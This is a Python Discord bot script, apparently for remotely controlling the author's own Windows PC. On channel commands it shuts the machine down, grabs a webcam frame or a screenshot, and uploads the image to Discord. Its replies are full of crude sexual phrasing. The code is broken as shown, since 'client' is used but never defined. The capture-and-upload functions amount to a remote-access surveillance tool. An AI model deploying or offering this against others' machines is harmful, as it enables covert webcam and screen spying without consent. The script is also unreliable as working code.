TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
import os
import discord
import pyautogui
import cv2          #use 'pip install opencv-python==4.5.3.56'
from pynput.keyboard import Key, Controller
import time
import sys

@client.event
async def on_ready():
    print("logged")

@client.event
async def on_message(message):
    mess = str(message.content)
    if message.channel.name == 'bot-talk':
        if mess.lower() == 'ping':
            await message.channel.send("_moans_ \ndeeper~")
            return

        if mess.lower() == 'list':
            await message.channel.send("`ping: checks if i'm horny\nshut: fucks the machine\nshow: shows camera input\nshot: shows current screen\nstop: fucks the program`")
            return

        if mess.lower() == 'shut':
            os.system("shutdown -s -t 5")
            await message.channel.send(message.author.mention + " `fucking off`")
            return

        if mess.lower() == 'show':
            cam_port = 1
            cam = cv2.VideoCapture(cam_port)
            result, image = cam.read()
            cv2.imwrite("py.jpg", image)
            await message.channel.send(file=discord.File("py.jpg"))
            os.remove("py.jpg")
            return

        if mess.lower() == 'shot':
            keyboard = Controller()     #this is to make sure the taskbar is captured
            keyboard.press(Key.cmd)     #as if i have auto hide taskbar
            keyboard.release(Key.cmd)
            time.sleep(1)

            image = pyautogui.screenshot() #screenshot with taskbar
            image.save("s.png")
            await message.channel.send(file=discord.File("s.png"))
            os.remove("s.png")
            return

        if mess.lower() == 'stop':
            await message.channel.send(message.author.mention + " successfully fucked")
            sys.exit()

client.run(TOKEN)
